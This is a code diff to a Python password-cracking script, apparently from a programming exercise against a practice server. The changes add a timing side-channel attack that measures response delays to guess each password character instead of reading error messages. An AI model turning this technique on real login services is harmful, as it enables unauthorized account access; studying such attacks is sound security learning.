@@ -3,6 +3,7 @@ import socket
 import itertools
 import string
 import json
+import datetime
 from urllib.request import urlopen
 
 
@@ -68,18 +69,44 @@ def check_login():
             return login
 
 
+def set_delta(login):
+    times = []
+    for i in range(len(symbols)):               # checking response time for each one-digit symbol
+        password = symbols[i]
+        time_send = datetime.datetime.now()
+        get_response(login, password)
+        time_return = datetime.datetime.now()
+        delta = time_return - time_send
+        times.append(delta)                     # adding all response times to list
+        times.sort(reverse=True)                # sorting the list from bigger
+
+    a = times[0] - times[1]                     # finding delta between 2 maximum times
+    a = float(a.total_seconds())
+    s = str(a)
+    f = len(s[s.index('.') + 1:])               # finding number of symbols after a comma
+    for n in range(1, f + 1):                   # rounding to 1 not-null symbol
+        b = int(a * (10 ** (f - n))) / 10 ** (f - n)
+        if b == 0:
+            return datetime.timedelta(seconds=a)
+        a = b
+
+
 def check_password(login):
     count = 0
     password = symbols[count]
+    main_delta = set_delta(login)               # finding difference between response times
     while True:
+        time_send = datetime.datetime.now()
         response = get_response(login, password)
-        if response == 'Wrong password!':
+        time_return = datetime.datetime.now()
+        delta = time_return - time_send
+        if response == 'Connection success!':
+            return password
+        if delta <= main_delta:                 # response == 'Wrong password!':
             password = password[:-1] + symbols[count]
-        elif response == 'Exception happened during login':
+        elif delta > main_delta:                # response == 'Exception happened during login'
             count = 0
             password += symbols[count]
-        elif response == 'Connection success!':
-            return password
         count += 1
 
 
